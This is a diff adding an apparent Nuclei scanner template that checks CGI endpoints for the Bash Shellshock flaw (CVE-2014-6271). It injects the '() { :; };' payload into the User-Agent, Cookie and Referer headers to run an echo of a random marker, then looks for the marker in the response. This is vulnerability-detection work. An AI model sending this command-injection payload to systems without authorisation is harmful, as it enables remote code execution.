@@ -1,0 +1,47 @@
+id: xpl-rce-shellshock
+info:
+  name: "Bash Shellshock RCE (CVE-2014-6271)"
+  author: imtaqin
+  severity: critical
+  description: |
+    Remote code execution via malformed function definitions in Bash
+    environment variables, exploitable through CGI endpoints.
+  tags:
+    - cve
+    - rce
+    - shellshock
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2014-6271
+  classification:
+    cvss-score: 10.0
+    cve-id: CVE-2014-6271
+
+variables:
+  marker: "xpl_shock_{{randstr}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/status"
+      - "{{BaseURL}}/cgi-bin/test"
+      - "{{BaseURL}}/cgi-bin/test.cgi"
+      - "{{BaseURL}}/cgi-bin/test.sh"
+      - "{{BaseURL}}/cgi-bin/bash"
+      - "{{BaseURL}}/cgi-bin/env"
+      - "{{BaseURL}}/cgi-bin/info.sh"
+    headers:
+      User-Agent: "() { :; }; echo; echo; /bin/echo {{marker}}"
+      Cookie: "() { :; }; echo; echo; /bin/echo {{marker}}"
+      Referer: "() { :; }; echo; echo; /bin/echo {{marker}}"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{marker}}"
+        name: body-reflection
+      - type: word
+        part: header
+        words:
+          - "{{marker}}"
+        name: header-reflection
